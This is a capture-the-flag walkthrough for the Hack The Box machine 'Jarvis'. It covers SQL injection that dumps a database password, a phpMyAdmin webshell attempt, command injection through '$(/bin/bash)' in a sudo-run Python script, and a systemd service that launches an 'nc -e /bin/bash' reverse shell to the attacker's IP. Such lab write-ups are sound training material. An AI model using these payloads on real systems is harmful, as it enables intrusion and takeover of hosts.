@@ -1,0 +1,160 @@
+Jarvis - 10.10.10.143
+
+Hackthebox
+
+OS - Linux
+
+
+Foothold and User -
+
+We first start like any other and enumerate the box
+
+nmap -sV -sC -Pn 10.10.10.143
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
+|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
+|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Stark Hotel
+
+
+Noticed right away a title on port 80 so lets start by checking out the web app
+since 9 of 10 times ssh is not just an open door.
+
+during enumeration I noticed it had phpmyadmin backend and other php params to play
+with maybe try SQLi? Thats right on parameter code=6 doing a little sqlmap or manaully
+if your feeling 1337 lol. 
+
+database management system users password hashes:                              
+[*] DBadmin [1]:
+    password hash: *2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
+    clear-text password: imissyou
+
+Jackpot after finding the right injection we now have a database user and can login
+to the phpmyadmin panel. So next step? lets see if we can create a new db yep can do
+that lets see if we can make tables yep.
+
+http://10.10.10.143/phpmyadmin - login database here
+
+So here is the manual way of injecting a backend php panel the right way not with one 
+of the common webshells like pentest monkey but it is a shell that keeps on giving lol. 
+So we will take a look at the right way to do this. I must first warn you that this did not work
+and I am showing you to learn bud :). * Note there are other methods out Google it!!
+
+First create yourself a new database then create a table names matter so make them
+simple or get ready to copy and paste.
+
+Second set table up like this 
+Type = VARCHAR
+Length = 4096
+
+Create your table then click on SQL tab so we can enter in some commands
+
+INSERT into test values('<?php shellcode here?>') - use base64 encoded your 
+webshell here can use metasploit to generate one or look up examples but very 
+critical to encode them to bypass filters if any are there.
+
+SELECT * INTO dumpfile '/var/www/html/shell.php' from test = Here dumps values from /tmp
+into document root *Note it is vital to know where document root of the webserver is this will
+not work look for phpinfo(); if not use other means to find this datapoint
+
+Now your shell is at the root of the webserver http://example.com/shell.php 
+Travel there and boom shell granted in other cases!!
+
+Now that that or other methods you tried never worked lets make it simple by looking at the 
+version of Phpmyadmin we see its vulnerable to the Authenicated LFI RCE exploit which search
+your version of metasploit you will see it. https://www.rapid7.com/db/modules/exploit/multi/http/phpmyadmin_lfi_rce
+
+
+Now after a lot of bad noise from me you have a shell remember you have creds right? Should
+be a low priv user now www-data.
+
+Upgrade shell - python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+and might wanna nc back to your own machine depends was pretty unstable thru
+metasploit the shell was. Running sudo lets see what we can do..
+
+-------------------------------------------------------------------------------------------------------------
+We can sudo without supplying a password!
+Matching Defaults entries for www-data on jarvis:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on jarvis:
+    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
+
+So looking around we see some intresting stuff going on including this python script in
+/var/www/Admin-Utilities we see a special script lets look at the code if we can.
+
+--------------------------------------------------------------------------------------------------------------
+
+cat simpler.py
+
+Here at the bottom hmm pretty odd it takes a second argument and notice it runs with the user pepper
+with sudo so lets try to exploit this and see if we can elevate.
+
+sudo -u pepper ./simpler.py -p
+Enter an IP: 10.1.1.1 $(/bin/bash) 
+
+Whelp looks like we are pepper now!! So lets go get that user flag
+
+cat /home/pepper/user.txt
+2afa36c4f05b37b**************
+
+----------------------------------------------------------------------------------------------------------------
+
+Root -
+
+Now root was pretty cool and goes to show anything is hackable given the right person behind a keyboard
+we now look around seeing what we can get too as pepper.
+
+
+Looking thru all of it nothing sticks out except for being able to run systemd so hmm how
+do we exploit something like that. With some google ninja methods I came up with a method 
+for the madness.
+
+First find a readable and writable directory for user pepper don't want privs getting in the
+way now lol.
+
+First create a .service file enter the following
+
+[Unit]
+Description=tmpservice
+[Service]
+Type=simple
+User=root
+WorkingDirectory=/tmp
+ExecStart=/bin/bash /home/pepper/sh.sh 
+[Install]
+
+Next create a shell file to execute
+
+echo "nc -e /bin/bash 10.10.15.70 9999" > sh.sh
+
+Next how do we exploit this now?? 
+
+$sudo systemctl start tmpservice 
+
+
+inside your sh.sh you have your netcat orders
+
+go back to your machine and
+
+GOT ROOT!!
+listening on [any] 9999 ...
+connect to [10.10.15.70] from supersecurehotel.htb [10.10.10.143] 41142
+id
+uid=0(root) gid=0(root) groups=0(root)
+cat /root/root.txt
+d41d8cd98f00b204e**********
+
+
+Hacktheplanet!!
+-----------------------------------------------------------------------------------------------------------------
